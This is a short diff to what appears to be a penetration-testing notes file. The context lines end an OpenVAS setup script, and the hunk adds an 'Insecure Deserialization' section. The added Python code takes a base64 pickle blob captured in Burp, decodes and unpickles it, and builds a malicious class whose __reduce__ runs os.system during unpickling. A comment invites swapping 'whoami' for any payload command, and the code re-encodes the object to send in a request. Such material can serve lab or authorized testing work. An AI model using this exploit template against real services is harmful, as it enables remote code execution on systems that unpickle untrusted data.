@@ -266,3 +266,34 @@ sudo gvm-check-setup
 
 echo "[*] Setup complete. Access OpenVAS web UI at https://localhost:9392"
 echo "[*] Log in with the admin credentials provided at the end of setup."
+
+
+
+## Insecure Deserialization
+
+import base64
+import pickle
+import os
+
+# Paste base64 string intercepted from Burp
+encoded = '<copied_base64_string>'
+
+data = base64.b64decode(encoded)
+obj = pickle.loads(data)
+
+# Option A: Modify existing object attributes
+# Example (if obj is dict-like):
+# obj['username'] = 'admin'
+
+# Option B: Replace obj with malicious payload class
+class MaliciousPayload:
+    def __reduce__(self):
+        # Command to execute during unpickling
+        return (os.system, ('whoami',))  # change 'whoami' to your payload command
+
+obj = MaliciousPayload()
+
+# Serialize and encode to send in request
+new_data = pickle.dumps(obj)
+new_encoded = base64.b64encode(new_data).decode()
+print(new_encoded)
